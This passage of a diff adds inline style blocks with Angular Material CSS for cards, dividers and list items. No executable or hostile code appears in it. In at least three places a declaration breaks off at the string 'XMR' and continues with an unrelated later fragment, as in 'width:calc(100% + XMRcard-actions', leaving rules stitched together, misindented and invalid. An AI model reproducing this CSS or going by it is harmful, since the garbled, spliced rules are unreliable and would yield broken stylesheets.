+        }
+
+        .mat-card.mat-card-flat {
+            box-shadow: none
+        }
+
+        @media screen and (-ms-high-contrast:active) {
+            .mat-card {
+                outline: solid 1px
+            }
+        }
+
+        .mat-card-actions,
+        .mat-card-content,
+        .mat-card-subtitle,
+        .mat-card-title {
+            display: block;
+            margin-bottom: 16px
+        }
+
+        .mat-card-actions {
+            margin-left: -16px;
+            margin-right: -16px;
+            padding: 8px 0
+        }
+
+        .mat-card-actions-align-end {
+            display: flex;
+            justify-content: flex-end
+        }
+
+        .mat-card-image {
+            width:calc(100% + XMRcard-actions .mat-button, .mat-card-actions .mat-raised-button {
+                    margin:0 4px
+                }
+
+                .mat-card-header {
+                    display:flex; flex-direction:row
+                }
+
+                .mat-card-header-text {
+                    margin:0 8px
+                }
+
+                .mat-card-avatar {
+                    height:XMR-sm-image, .mat-card-title-group>.mat-card-xl-image {
+                        margin:-8px 0 8px 0
+                    }
+
+                    .mat-card-title-group {
+                        display:flex; justify-content:space-between; margin:0 -8px
+                    }
+
+                    .mat-card-sm-image {
+                        width:80px; height:80px
+                    }
+
+                    .mat-card-md-image {
+                        width:112px; height:112px
+                    }
+
+                    .mat-card-lg-image {
+                        width:152px; height:152px
+                    }
+
+                    .mat-card-xl-image {
+                        width:240px; height:240px; margin:-8px
+                    }
+
+                    @media (max-width:599px) {
+                        .mat-card {
+                            padding:24px 16px
+                        }
+
+                        .mat-card-actions {
+                            margin-left:-8px; margin-right:-8px
+                        }
+
+                        .mat-card-image {
+                            width:calc(100% + 32px); margin:16px -16px
+                        }
+
+                        .mat-card-title-group {
+                            margin:0
+                        }
+
+                        .mat-card-xl-image {
+                            margin-left:0; margin-right:0
+                        }
+
+                        .mat-card-header {
+                            margin:-8px 0 0 0
+                        }
+
+                        .mat-card-footer {
+                            margin-left:-16px; margin-right:-16px
+                        }
+                    }
+
+                    .mat-card-content>:first-child, .mat-card>:first-child {
+                        margin-top:0
+                    }
+
+                    .mat-card-content>:last-child:not(.mat-card-footer), .mat-card>:last-child:not(.mat-card-footer) {
+                        margin-bottom:0
+                    }
+
+                    .mat-card-image:first-child {
+                        margin-top:-24px
+                    }
+
+                    .mat-card>.mat-card-actions:last-child {
+                        margin-bottom:-16px; padding-bottom:0
+                    }
+
+                    .mat-card-actions .mat-button:first-child, .mat-card-actions .mat-raised-button:first-child {
+                        margin-left:0; margin-right:0
+                    }
+
+                    .mat-card-subtitle:not(:first-child), .mat-card-title:not(:first-child) {
+                        margin-top:-4px
+                    }
+
+                    .mat-card-header .mat-card-subtitle:not(:first-child) {
+                        margin-top:-8px
+                    }
+
+                    .mat-card>.mat-card-xl-image:first-child {
+                        margin-top:-8px
+                    }
+
+                    .mat-card>.mat-card-xl-image:last-child {
+                        margin-bottom:-8px
+                    }
+    </style>
+    <style></style> 
+    <style>
+        .mat-divider {
+            display: block;
+            margin: 0;
+            border-top-width: 1px;
+            border-top-style: solid
+        }
+
+        .mat-divider.mat-divider-vertical {
+            border-top: 0;
+            border-right-width: 1px;
+            border-right-style: solid
+        }
+
+        .mat-divider.mat-divider-inset {
+            margin-left: 80px
+        }
+
+        [dir=rtl] .mat-divider.mat-divider-inset {
+            margin-left: auto;
+            margin-right: 80px
+        }
+
+        .mat-subheader {
+            display: flex;
+            box-sizing: border-box;
+            padding: 16px;
+            align-items: center
+        }
+
+        .mat-list .mat-subheader,
+        .mat-nav-list .mat-subheader,
+        .mat-selection-list .mat-subheader {
+            margin: 0
+        }
+
+        .mat-list,
+        .mat-nav-list,
+        .mat-selection-list {
+            padding-top: 8px;
+            display: block;
+            -webkit-tap-highlight-color: transparent
+        }
+
+        .mat-list .mat-subheader,
+        .mat-nav-list .mat-subheader,
+        .mat-selection-list .mat-subheader {
+            height: 48px;
+            line-height: 16px
+        }
+
+        .mat-list .mat-subheader:first-child,
+        .mat-nav-list .mat-subheader:first-child,
+        .mat-selection-list .mat-subheader:first-child {
+            margin-top: -8px
+        }
+
+        .mat-list .mat-list-item,
+        .mat-list .mat-list-option,
+        .mat-nav-list .mat-list-item,
+        .mat-nav-list .mat-list-option,
+        .mat-selection-list .mat-list-item,
+        .mat-selection-list .mat-list-option {
+            display: block;
+            height: 48px;
+            -webkit-tap-highlight-color: transparent
+        }
+
+        .mat-list .mat-list-item .mat-list-item-content,
+        .mat-list .mat-list-option .mat-list-item-content,
+        .mat-nav-list .mat-list-item .mat-list-item-content,
+        .mat-nav-list .mat-list-option .mat-list-item-content,
+        .mat-selection-list .mat-list-item .mat-list-item-content,
+        .mat-selection-list .mat-list-option .mat-list-item-content {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            box-sizing: border-box;
+            padding: 0 16px;
+            position: relative;
+            height: inherit
+        }
+
+        .mat-list .mat-list-item .mat-list-item-content-reverse,
+        .mat-list .mat-list-option .mat-list-item-content-reverse,
+        .mat-nav-list .mat-list-item .mat-list-item-content-reverse,
+        .mat-nav-list .mat-list-option .mat-list-item-content-reverse,
+        .mat-selection-list .mat-list-item .mat-list-item-content-reverse,
+        .mat-selection-list .mat-list-option .mat-list-item-content-reverse {
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            flex-direction: row-reverse;
+            justify-content: space-around
+        }
+
+        .mat-list .mat-list-item .mat-list-item-ripple,
+        .mat-list .mat-list-option .mat-list-item-ripple,
+        .mat-nav-list .mat-list-item .mat-list-item-ripple,
+        .mat-nav-list .mat-list-option .mat-list-item-ripple,
+        .mat-selection-list .mat-list-item .mat-list-item-ripple,
+        .mat-selection-list .mat-list-option .mat-list-item-ripple {
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            position: absolute;
+            pointer-events: none
+        }
+
+        .mat-list .mat-list-item.mat-list-item-with-avatar,
+        .mat-list .mat-list-option.mat-list-item-with-avatar,
+        .mat-nav-list .mat-list-item.mat-list-item-with-avatar,
+        .mat-nav-list .mat-list-option.mat-list-item-with-avatar,
+        .mat-selection-list .mat-list-item.mat-list-item-with-avatar,
+        .mat-selection-list .mat-list-option.mat-list-item-with-avatar {
+            height: 56px
+        }
+
+        .mat-list .mat-list-item.mat-2-line,
+        .mat-list .mat-list-option.mat-2-line,
+        .mat-nav-list .mat-list-item.mat-2-line,
+        .mat-nav-list .mat-list-option.mat-2-line,
+        .mat-selection-list .mat-list-item.mat-2-line,
+        .mat-selection-list .mat-list-option.mat-2-line {
+            height: 72px
+        }
+
+        .mat-list .mat-list-item.mat-3-line,
+        .mat-list .mat-list-option.mat-3-line,
+        .mat-nav-list .mat-list-item.mat-3-line,
+        .mat-nav-list .mat-list-option.mat-3-line,
+        .mat-selection-list .mat-list-item.mat-3-line,
+        .mat-selection-list .mat-list-option.mat-3-line {
+            height: 88px
+        }
+
+        .mat-list .mat-list-item.mat-multi-line,
+        .mat-list .mat-list-option.mat-multi-line,
+        .mat-nav-list .mat-list-item.mat-multi-line,
+        .mat-nav-list .mat-list-option.mat-multi-line,
+        .mat-selection-list .mat-list-item.mat-multi-line,
+        .mat-selection-list .mat-list-option.mat-multi-line {
+            height: auto
+        }
+
+        .mat-list .mat-list-item.mat-multi-line .mat-list-item-content,
+        .mat-list .mat-list-option.mat-multi-line .mat-list-item-content,
+        .mat-nav-list .mat-list-item.mat-multi-line .mat-list-item-content,
+        .mat-nav-list .mat-list-option.mat-multi-line .mat-list-item-content,
+        .mat-selection-list .mat-list-item.mat-multi-line .mat-list-item-content,
+        .mat-selection-list .mat-list-option.mat-multi-line .mat-list-item-content {
+            padding-top: 16px;
+            padding-bottom: 16px
+        }
+
+        .mat-list .mat-list-item .mat-list-text,
+        .mat-list .mat-list-option .mat-list-text,
+        .mat-nav-list .mat-list-item .mat-list-text,
+        .mat-nav-list .mat-list-option .mat-list-text,
+        .mat-selection-list .mat-list-item .mat-list-text,
+        .mat-selection-list .mat-list-option .mat-list-text {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            box-sizing: border-box;
+            overflow: hidden;
+            padding: 0
+        }
+
+        .mat-list .mat-list-item .mat-list-text>*,
+        .mat-list .mat-list-option .mat-list-text>*,
+        .mat-nav-list .mat-list-item .mat-list-text>*,
+        .mat-nav-list .mat-list-option .mat-list-text>*,
+        .mat-selection-list .mat-list-item .mat-list-text>*,
+        .mat-selection-list .mat-list-option .mat-list-text>* {
+            margin: 0;
+            padding: 0;
+            font-weight: 400;
+            font-size: inherit
+        }
+
+        .mat-list .mat-list-item .mat-list-text:empty,
+        .mat-list .mat-list-option .mat-list-text:empty,
+        .mat-nav-list .mat-list-item .mat-list-text:empty,
+        .mat-nav-list .mat-list-option .mat-list-text:empty,
+        .mat-selection-list .mat-list-item .mat-list-text:empty,
+        .mat-selection-list .mat-list-option .mat-list-text:empty {
+            display: none
+        }
+
+        .mat-list .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+        .mat-list .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
+        .mat-list .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+        .mat-list .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text,
+        .mat-nav-list .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+        .mat-nav-list .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
+        .mat-nav-list .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+        .mat-nav-list .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text,
+        .mat-selection-list .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+        .mat-selection-list .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
+        .mat-selection-list .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+        .mat-selection-list .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text {
+            padding-right: 0;
+            padding-left: 16px
+        }
+
+        [dir=rtl] .mat-list .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+        [dir=rtl] .mat-list .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
+        [dir=rtl] .mat-list .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+        [dir=rtl] .mat-list .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text,
+        [dir=rtl] .mat-nav-list .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+        [dir=rtl] .mat-nav-list .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
+        [dir=rtl] .mat-nav-list .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+        [dir=rtl] .mat-nav-list .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text,
+        [dir=rtl] .mat-selection-list .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+        [dir=rtl] .mat-selection-list .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
+        [dir=rtl] .mat-selection-list .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+        [dir=rtl] .mat-selection-list .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text {
+            padding-right: 16px;
+            padding-left: 0
+        }
+
+        .mat-list .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+        .mat-list .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        .mat-list .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+        .mat-list .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        .mat-nav-list .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+        .mat-nav-list .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        .mat-nav-list .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+        .mat-nav-list .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        .mat-selection-list .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+        .mat-selection-list .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        .mat-selection-list .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+        .mat-selection-list .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text {
+            padding-left: 0;
+            padding-right: 16px
+        }
+
+        [dir=rtl] .mat-list .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+        [dir=rtl] .mat-list .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        [dir=rtl] .mat-list .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+        [dir=rtl] .mat-list .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        [dir=rtl] .mat-nav-list .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+        [dir=rtl] .mat-nav-list .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        [dir=rtl] .mat-nav-list .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+        [dir=rtl] .mat-nav-list .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        [dir=rtl] .mat-selection-list .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+        [dir=rtl] .mat-selection-list .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        [dir=rtl] .mat-selection-list .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+        [dir=rtl] .mat-selection-list .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text {
+            padding-right: 0;
+            padding-left: 16px
+        }
+
+        .mat-list .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
+        .mat-list .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        .mat-list .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
+        .mat-list .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        .mat-nav-list .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
+        .mat-nav-list .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        .mat-nav-list .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
+        .mat-nav-list .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        .mat-selection-list .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
+        .mat-selection-list .mat-list-item.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+        .mat-selection-list .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content .mat-list-text,
+        .mat-selection-list .mat-list-option.mat-list-item-with-avatar.mat-list-option .mat-list-item-content-reverse .mat-list-text {
+            padding-right: 16px;
+            padding-left: 16px
+        }
+
+        .mat-list .mat-list-item .mat-list-avatar,
+        .mat-list .mat-list-option .mat-list-avatar,
+        .mat-nav-list .mat-list-item .mat-list-avatar,
+        .mat-nav-list .mat-list-option .mat-list-avatar,
+        .mat-selection-list .mat-list-item .mat-list-avatar,
+        .mat-selection-list .mat-list-option .mat-list-avatar {
+            flex-shrink: 0;
+
+            width:XMRmat-divider-inset,
+            .mat-list .mat-list-option .mat-list-avatar~.mat-divider-inset,
+            .mat-nav-list .mat-list-item .mat-list-avatar~.mat-divider-inset,
+            .mat-nav-list .mat-list-option .mat-list-avatar~.mat-divider-inset,
+            .mat-selection-list .mat-list-item .mat-list-avatar~.mat-divider-inset,
+            .mat-selection-list .mat-list-option .mat-list-avatar~.mat-divider-inset {
+                margin-left: 72px;
+                width: calc(100% - 72px)
+            }
+
+            [dir=rtl] .mat-list .mat-list-item .mat-list-avatar~.mat-divider-inset,
+            [dir=rtl] .mat-list .mat-list-option .mat-list-avatar~.mat-divider-inset,
+            [dir=rtl] .mat-nav-list .mat-list-item .mat-list-avatar~.mat-divider-inset,
+            [dir=rtl] .mat-nav-list .mat-list-option .mat-list-avatar~.mat-divider-inset,
+            [dir=rtl] .mat-selection-list .mat-list-item .mat-list-avatar~.mat-divider-inset,
+            [dir=rtl] .mat-selection-list .mat-list-option .mat-list-avatar~.mat-divider-inset {
+                margin-left: auto;
+                margin-right: 72px
+            }
+
+            .mat-list .mat-list-item .mat-list-icon,
+            .mat-list .mat-list-option .mat-list-icon,
+            .mat-nav-list .mat-list-item .mat-list-icon,
+            .mat-nav-list .mat-list-option .mat-list-icon,
+            .mat-selection-list .mat-list-item .mat-list-icon,
+            .mat-selection-list .mat-list-option .mat-list-icon {
+                flex-shrink: 0;
+                width: 24px;
+                height: 24px;
+                font-size: 24px;
+                box-sizing: content-box;
+                border-radius: 50%;
+                padding: 4px
+            }
+
+            .mat-list .mat-list-item .mat-list-icon~.mat-divider-inset,
+            .mat-list .mat-list-option .mat-list-icon~.mat-divider-inset,
+            .mat-nav-list .mat-list-item .mat-list-icon~.mat-divider-inset,
+            .mat-nav-list .mat-list-option .mat-list-icon~.mat-divider-inset,
+            .mat-selection-list .mat-list-item .mat-list-icon~.mat-divider-inset,
+            .mat-selection-list .mat-list-option .mat-list-icon~.mat-divider-inset {
+                margin-left: 64px;
+                width: calc(100% - 64px)
+            }
+
+            [dir=rtl] .mat-list .mat-list-item .mat-list-icon~.mat-divider-inset,
+            [dir=rtl] .mat-list .mat-list-option .mat-list-icon~.mat-divider-inset,
+            [dir=rtl] .mat-nav-list .mat-list-item .mat-list-icon~.mat-divider-inset,
+            [dir=rtl] .mat-nav-list .mat-list-option .mat-list-icon~.mat-divider-inset,
+            [dir=rtl] .mat-selection-list .mat-list-item .mat-list-icon~.mat-divider-inset,
+            [dir=rtl] .mat-selection-list .mat-list-option .mat-list-icon~.mat-divider-inset {
+                margin-left: auto;
+                margin-right: 64px
+            }
+
+            .mat-list .mat-list-item .mat-divider,
+            .mat-list .mat-list-option .mat-divider,
+            .mat-nav-list .mat-list-item .mat-divider,
+            .mat-nav-list .mat-list-option .mat-divider,
+            .mat-selection-list .mat-list-item .mat-divider,
+            .mat-selection-list .mat-list-option .mat-divider {
+                position: absolute;
+                bottom: 0;
+                left: 0;
+                width: 100%;
+                margin: 0
+            }
+
+            [dir=rtl] .mat-list .mat-list-item .mat-divider,
+            [dir=rtl] .mat-list .mat-list-option .mat-divider,
+            [dir=rtl] .mat-nav-list .mat-list-item .mat-divider,
+            [dir=rtl] .mat-nav-list .mat-list-option .mat-divider,
+            [dir=rtl] .mat-selection-list .mat-list-item .mat-divider,
+            [dir=rtl] .mat-selection-list .mat-list-option .mat-divider {
+                margin-left: auto;
+                margin-right: 0
+            }
+
+            .mat-list .mat-list-item .mat-divider.mat-divider-inset,
+            .mat-list .mat-list-option .mat-divider.mat-divider-inset,
+            .mat-nav-list .mat-list-item .mat-divider.mat-divider-inset,
+            .mat-nav-list .mat-list-option .mat-divider.mat-divider-inset,
+            .mat-selection-list .mat-list-item .mat-divider.mat-divider-inset,
+            .mat-selection-list .mat-list-option .mat-divider.mat-divider-inset {
+                position: absolute
+            }
+
+            .mat-list[dense],
+            .mat-nav-list[dense],
+            .mat-selection-list[dense] {
+                padding-top: 4px;
+                display: block
+            }
+
+            .mat-list[dense] .mat-subheader,
+            .mat-nav-list[dense] .mat-subheader,
+            .mat-selection-list[dense] .mat-subheader {
+                height: 40px;
+                line-height: 8px
+            }
+
+            .mat-list[dense] .mat-subheader:first-child,
+            .mat-nav-list[dense] .mat-subheader:first-child,
+            .mat-selection-list[dense] .mat-subheader:first-child {
+                margin-top: -4px
+            }
+
+            .mat-list[dense] .mat-list-item,
+            .mat-list[dense] .mat-list-option,
+            .mat-nav-list[dense] .mat-list-item,
+            .mat-nav-list[dense] .mat-list-option,
+            .mat-selection-list[dense] .mat-list-item,
+            .mat-selection-list[dense] .mat-list-option {
+                display: block;
+                height: 40px;
+                -webkit-tap-highlight-color: transparent
+            }
+
+            .mat-list[dense] .mat-list-item .mat-list-item-content,
+            .mat-list[dense] .mat-list-option .mat-list-item-content,
+            .mat-nav-list[dense] .mat-list-item .mat-list-item-content,
+            .mat-nav-list[dense] .mat-list-option .mat-list-item-content,
+            .mat-selection-list[dense] .mat-list-item .mat-list-item-content,
+            .mat-selection-list[dense] .mat-list-option .mat-list-item-content {
+                display: flex;
+                flex-direction: row;
+                align-items: center;
+                box-sizing: border-box;
+                padding: 0 16px;
+                position: relative;
+                height: inherit
+            }
+
+            .mat-list[dense] .mat-list-item .mat-list-item-content-reverse,
+            .mat-list[dense] .mat-list-option .mat-list-item-content-reverse,
+            .mat-nav-list[dense] .mat-list-item .mat-list-item-content-reverse,
+            .mat-nav-list[dense] .mat-list-option .mat-list-item-content-reverse,
+            .mat-selection-list[dense] .mat-list-item .mat-list-item-content-reverse,
+            .mat-selection-list[dense] .mat-list-option .mat-list-item-content-reverse {
+                display: flex;
+                align-items: center;
+                padding: 0 16px;
+                flex-direction: row-reverse;
+                justify-content: space-around
+            }
+
+            .mat-list[dense] .mat-list-item .mat-list-item-ripple,
+            .mat-list[dense] .mat-list-option .mat-list-item-ripple,
+            .mat-nav-list[dense] .mat-list-item .mat-list-item-ripple,
+            .mat-nav-list[dense] .mat-list-option .mat-list-item-ripple,
+            .mat-selection-list[dense] .mat-list-item .mat-list-item-ripple,
+            .mat-selection-list[dense] .mat-list-option .mat-list-item-ripple {
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                position: absolute;
+                pointer-events: none
+            }
+
+            .mat-list[dense] .mat-list-item.mat-list-item-with-avatar,
+            .mat-list[dense] .mat-list-option.mat-list-item-with-avatar,
+            .mat-nav-list[dense] .mat-list-item.mat-list-item-with-avatar,
+            .mat-nav-list[dense] .mat-list-option.mat-list-item-with-avatar,
+            .mat-selection-list[dense] .mat-list-item.mat-list-item-with-avatar,
+            .mat-selection-list[dense] .mat-list-option.mat-list-item-with-avatar {
+                height: 48px
+            }
+
+            .mat-list[dense] .mat-list-item.mat-2-line,
+            .mat-list[dense] .mat-list-option.mat-2-line,
+            .mat-nav-list[dense] .mat-list-item.mat-2-line,
+            .mat-nav-list[dense] .mat-list-option.mat-2-line,
+            .mat-selection-list[dense] .mat-list-item.mat-2-line,
+            .mat-selection-list[dense] .mat-list-option.mat-2-line {
+                height: 60px
+            }
+
+            .mat-list[dense] .mat-list-item.mat-3-line,
+            .mat-list[dense] .mat-list-option.mat-3-line,
+            .mat-nav-list[dense] .mat-list-item.mat-3-line,
+            .mat-nav-list[dense] .mat-list-option.mat-3-line,
+            .mat-selection-list[dense] .mat-list-item.mat-3-line,
+            .mat-selection-list[dense] .mat-list-option.mat-3-line {
+                height: 76px
+            }
+
+            .mat-list[dense] .mat-list-item.mat-multi-line,
+            .mat-list[dense] .mat-list-option.mat-multi-line,
+            .mat-nav-list[dense] .mat-list-item.mat-multi-line,
+            .mat-nav-list[dense] .mat-list-option.mat-multi-line,
+            .mat-selection-list[dense] .mat-list-item.mat-multi-line,
+            .mat-selection-list[dense] .mat-list-option.mat-multi-line {
+                height: auto
+            }
+
+            .mat-list[dense] .mat-list-item.mat-multi-line .mat-list-item-content,
+            .mat-list[dense] .mat-list-option.mat-multi-line .mat-list-item-content,
+            .mat-nav-list[dense] .mat-list-item.mat-multi-line .mat-list-item-content,
+            .mat-nav-list[dense] .mat-list-option.mat-multi-line .mat-list-item-content,
+            .mat-selection-list[dense] .mat-list-item.mat-multi-line .mat-list-item-content,
+            .mat-selection-list[dense] .mat-list-option.mat-multi-line .mat-list-item-content {
+                padding-top: 16px;
+                padding-bottom: 16px
+            }
+
+            .mat-list[dense] .mat-list-item .mat-list-text,
+            .mat-list[dense] .mat-list-option .mat-list-text,
+            .mat-nav-list[dense] .mat-list-item .mat-list-text,
+            .mat-nav-list[dense] .mat-list-option .mat-list-text,
+            .mat-selection-list[dense] .mat-list-item .mat-list-text,
+            .mat-selection-list[dense] .mat-list-option .mat-list-text {
+                display: flex;
+                flex-direction: column;
+                width: 100%;
+                box-sizing: border-box;
+                overflow: hidden;
+                padding: 0
+            }
+
+            .mat-list[dense] .mat-list-item .mat-list-text>*,
+            .mat-list[dense] .mat-list-option .mat-list-text>*,
+            .mat-nav-list[dense] .mat-list-item .mat-list-text>*,
+            .mat-nav-list[dense] .mat-list-option .mat-list-text>*,
+            .mat-selection-list[dense] .mat-list-item .mat-list-text>*,
+            .mat-selection-list[dense] .mat-list-option .mat-list-text>* {
+                margin: 0;
+                padding: 0;
+                font-weight: 400;
+                font-size: inherit
+            }
+
+            .mat-list[dense] .mat-list-item .mat-list-text:empty,
+            .mat-list[dense] .mat-list-option .mat-list-text:empty,
+            .mat-nav-list[dense] .mat-list-item .mat-list-text:empty,
+            .mat-nav-list[dense] .mat-list-option .mat-list-text:empty,
+            .mat-selection-list[dense] .mat-list-item .mat-list-text:empty,
+            .mat-selection-list[dense] .mat-list-option .mat-list-text:empty {
+                display: none
+            }
+
+            .mat-list[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+            .mat-list[dense] .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
+            .mat-list[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+            .mat-list[dense] .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text,
+            .mat-nav-list[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+            .mat-nav-list[dense] .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
+            .mat-nav-list[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+            .mat-nav-list[dense] .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text,
+            .mat-selection-list[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+            .mat-selection-list[dense] .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
+            .mat-selection-list[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+            .mat-selection-list[dense] .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text {
+                padding-right: 0;
+                padding-left: 16px
+            }
+
+            [dir=rtl] .mat-list[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+            [dir=rtl] .mat-list[dense] .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
+            [dir=rtl] .mat-list[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+            [dir=rtl] .mat-list[dense] .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text,
+            [dir=rtl] .mat-nav-list[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+            [dir=rtl] .mat-nav-list[dense] .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
+            [dir=rtl] .mat-nav-list[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+            [dir=rtl] .mat-nav-list[dense] .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-item.mat-list-option .mat-list-item-content .mat-list-text,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content .mat-list-text,
+            [dir=rtl] .mat-selection-list[dense] .mat-list-option.mat-list-option .mat-list-item-content .mat-list-text {
+                padding-right: 16px;
+                padding-left: 0
+            }
+
+            .mat-list[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+            .mat-list[dense] .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            .mat-list[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+            .mat-list[dense] .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            .mat-nav-list[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+            .mat-nav-list[dense] .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            .mat-nav-list[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+            .mat-nav-list[dense] .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            .mat-selection-list[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+            .mat-selection-list[dense] .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            .mat-selection-list[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+            .mat-selection-list[dense] .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text {
+                padding-left: 0;
+                padding-right: 16px
+            }
+
+            [dir=rtl] .mat-list[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+            [dir=rtl] .mat-list[dense] .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            [dir=rtl] .mat-list[dense] .mat-list-option.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+            [dir=rtl] .mat-list[dense] .mat-list-option.mat-list-option .mat-list-item-content-reverse .mat-list-text,
+            [dir=rtl] .mat-nav-list[dense] .mat-list-item.mat-list-item-with-avatar .mat-list-item-content-reverse .mat-list-text,
+            [dir=rtl] .mat-nav-list[dense] .mat-list-item.mat-list-option .mat-list-item-content-reverse .mat-list-text,
